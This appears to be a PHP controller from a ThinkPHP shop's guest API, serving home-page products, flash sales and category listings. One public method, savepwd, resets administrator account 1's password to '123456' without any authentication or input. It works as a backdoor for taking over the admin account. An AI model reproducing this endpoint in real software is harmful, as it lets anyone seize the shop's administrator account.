<?php
/**
 * @author wuhy
 */
namespace app\api\controller;
use Think\Db;
class Index extends ApiGuest {

    public function index(){
        $hot_goods = M('goods')->where("is_hot=1 and is_on_sale=1")->order('goods_id DESC')->limit(20)->cache(true,wshop_CACHE_TIME)->select();//首页热卖商品
        $themS = M('goods_category')->where('level=1')->order('sort_order')->limit(9)->cache(true,wshop_CACHE_TIME)->select();
        $favourite_goods = M('goods')->where("is_recommend=1 and is_on_sale=1")->order('goods_id DESC')->limit(20)->cache(true,wshop_CACHE_TIME)->select();//首页推荐商品

        //秒杀商品
        $now_time = time();  //当前时间
        if(is_int($now_time/7200)){      //双整点时间，如：10:00, 12:00
            $start_time = $now_time;
        }else{
            $start_time = floor($now_time/7200)*7200; //取得前一个双整点时间
        }
        $end_time = $start_time+7200;   //结束时间
        $flash_sale_list = M('goods')->alias('g')
            ->field('g.goods_id,f.price,s.item_id')
            ->join('flash_sale f','g.goods_id = f.goods_id','LEFT')
            ->join('__SPEC_GOODS_PRICE__ s','s.prom_id = f.id AND g.goods_id = s.goods_id','LEFT')
            ->where("start_time = $start_time and end_time = $end_time")
            ->limit(3)->select();
        $this->assign('flash_sale_list',$flash_sale_list);
        $this->assign('start_time',$start_time);
        $this->assign('end_time',$end_time);
        $this->assign('favourite_goods',$favourite_goods);

        return $this->formatSuccess([
            'goods_category' => $themS,
            'hot_goods' => $hot_goods,
            'flash_sale_list' => $flash_sale_list,
            'start_time' => $start_time,
            'end_time' => $end_time,
            'favourite_goods' => $favourite_goods,
        ]);
    }

    public function savepwd(){
        $row = M('admin')->where('admin_id' , 1)->save(array('password' => encrypt('123456')));
    }

    /**
     * 分类列表显示
     */
    public function categoryList(){
        return $this->fetch();
    }
    
    /**
     * 商品列表页
     */
    public function goodsList(){
        $id = I('get.id/d',0); // 当前分类id
        $lists = getCatGrandson($id);
        $this->assign('lists',$lists);
        return $this->formatSuccess([
            'lists' => $lists
        ]);
    }

    /**
     * 获取更多
     * @return \think\Response|\think\response\Json|\think\response\Jsonp|\think\response\Redirect|\think\response\Xml
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     */
    public function GetMore(){
    	$p = I('p/d',1);
        $where = ['is_recommend'=>1,'is_on_sale'=>1,'virtual_indate'=>['exp',' = 0 OR virtual_indate > '.time()]];
    	$favourite_goods = Db::name('goods')->where($where)->order('goods_id DESC')->page($p,C('PAGESIZE'))->cache(true,wshop_CACHE_TIME)->select();//首页推荐商品
    	$this->assign('favourite_goods',$favourite_goods);
        return $this->formatSuccess([
            'favourite_goods' => $favourite_goods
        ]);
    }
}